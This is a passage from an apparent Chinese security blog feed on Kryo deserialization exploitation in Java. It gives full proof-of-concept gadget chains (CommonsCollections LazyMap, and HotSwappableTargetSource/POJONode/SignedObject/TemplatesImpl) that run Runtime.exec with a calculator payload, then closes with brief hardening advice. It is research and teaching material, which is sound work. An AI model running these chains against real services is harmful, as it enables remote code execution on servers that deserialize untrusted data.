class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.Test.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">mp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;lsf&quot;</span>);</span><br><span class="line">        lazymap.clear();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazymap,ct);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> tiedMapEntry;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按理来说应该是可以触发的，但是设置了<br><code>new StdInstantiatorStrategy()</code><br>反序列化的create方法会把TiedMapEntry中的map变量名认成是value<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt><br>导致无法利用</p><h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><p>首先要触发到equals必须要有两个元素（node），而且该元素必须是同一类的，来看看HashMap的putVal源码看看为什么<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt><br>如果两个类都不是同一个类，就会直接进入到该if当中，而不会执行下面的equals。<br>接下来看看具体的代码</p><h4 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.support.GenericMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="comment">// 二次反序列化</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilGeneratedByJavassist&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public EvilGeneratedByJavassist()&#123;Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[] byteCode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 SignedObject</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置二次反序列化入口</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(pojoNode1, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次反序列化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pojoNode2);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;s&quot;</span>));</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, h1, h1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, h2, h2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(s,hashMap);</span><br><span class="line">        s.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链是<br><code>HotSwappableTargetSource.equals-&gt;XString.equals-&gt;POJONode.toString-&gt;SignedObject.getObject-&gt;POJONode.toString-&gt;getOutputProperties</code><br>可能有人会好奇为什么要绕一大圈调用两个POJONode.toString才能执行，直接调用最后那个不就行了吗，但是kryo默认是不反序列化transient字段的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" alt><br>所以_tfactory是不会被反序列化的，这样导致POJONode调用getter方法的时候会报错，导致执行不了getOutputProperties</p><h2 id="Kryo反序列化Javabean"><a href="#Kryo反序列化Javabean" class="headerlink" title="Kryo反序列化Javabean"></a>Kryo反序列化Javabean</h2><p>上面的反序列化都是默认去调用FieldSerializer<br>但是还有很多其他类型的Serializer，都继承Serializer<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" alt><br>这里面第一个就引起了我的注意，很多反序列化链都是通过调用一些JavaBean去触发一些操作的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" alt><br>看到简介，如何使用该Serializer<br>这里我直接给出简单的demo<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.register(MyClass.class,<span class="keyword">new</span> <span class="title class_">BeanSerializer</span>(kryo, MyClass.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        s.setNum(<span class="number">10</span>);</span><br><span class="line">        s.setHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="read-and-write"><a href="#read-and-write" class="headerlink" title="read and write"></a>read and write</h3><p>先来看看源码<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" alt><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" alt><br>可以发现两个函数都有个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">property.get</span><br><span class="line">property.set</span><br></pre></td></tr></table></figure><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" alt><br>这些就会触发该类的Bean方法<br>那么其他操作就应该类似于Fastjson里面的那些类了，这里就不在过多叙述了</p><h2 id="kryo的防护"><a href="#kryo的防护" class="headerlink" title="kryo的防护"></a>kryo的防护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.setRegistrationRequired(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>当使用如上代码，那么所有反序列化的类都必须要被注册，才会被反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.addDefaultSerializer(Class,Serializer)</span><br></pre></td></tr></table></figure><p>当使用上面的代码，可以增加自己的Serializer，自己实现serializer的时候增加相应的黑名单即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></li><li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md</a></li><li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入门kryo&quot;&gt;&lt;a href=&quot;#入门kryo&quot; class=&quot;headerlink&quot; title=&quot;入门kryo&quot;&gt;&lt;/a&gt;入门kryo&lt;/h2&gt;&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;首先看个简单的demo&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="kryo" scheme="http://example.com/tags/kryo/"/>
    
  </entry>
  
  <entry>
    <title>hessian反序列化</title>
    <link href="http://example.com/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-09-07T15:17:04.000Z</published>
    <updated>2023-09-13T05:28:41.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入门Hessian反序列化"><a href="#入门Hessian反序列化" class="headerlink" title="入门Hessian反序列化"></a>入门Hessian反序列化</h2><span id="more"></span><h3 id="People"><a href="#People" class="headerlink" title="People"></a>People</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 